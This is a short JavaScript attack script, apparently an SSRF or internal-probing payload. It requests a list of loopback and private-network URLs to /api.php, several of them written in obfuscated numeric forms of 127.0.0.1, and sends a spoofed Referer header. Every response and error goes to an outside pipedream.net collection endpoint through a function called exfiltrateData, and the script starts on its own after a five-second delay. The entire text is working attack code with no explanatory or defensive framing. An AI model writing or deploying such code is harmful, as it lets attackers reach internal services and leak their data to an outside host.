const ipValues = [
    "https://localhost/api.php",
    "https://localhost:80/api.php",
    "https://localhost:443/api.php",
    "https://127.0.0.1/api.php",
    "https://127.0.0.1:80/api.php",
    "https://127.0.0.1:443/api.php",
    "https://2130706433/api.php",          
    "https://0x7F000001/api.php",          
    "https://0177.0000.0000.0001/api.php",
    "https://0/api.php",
    "https://127.1/api.php",
    "https://10.0.0.0/api.php",
    "https://10.0.0.1/api.php",
    "https://172.16.0.0/api.php",
    "https://172.16.0.1/api.php",
    "https://192.168.1.0/api.php",
    "https://192.168.1.1/api.php"
];

function exfiltrateData(data) {
    fetch("https://ent3dxrn4z3ni.x.pipedream.net/?data=" + encodeURIComponent(data));
}

function fetchInternalAPI() {
    ipValues.forEach(ip => {
        fetch(ip, {
            headers: {
                "Referer": "http://127.0.0.1:",
            }
        })
        .then(response => response.text())
        .then(data => {
            exfiltrateData("Success at " + ip + ": " + data);
        })
        .catch(error => {
            console.error(`Error accessing ${ip}:`, error);
            exfiltrateData("Error at " + ip + ": " + error.message);
        });
    });
}

setTimeout(fetchInternalAPI, 5000);
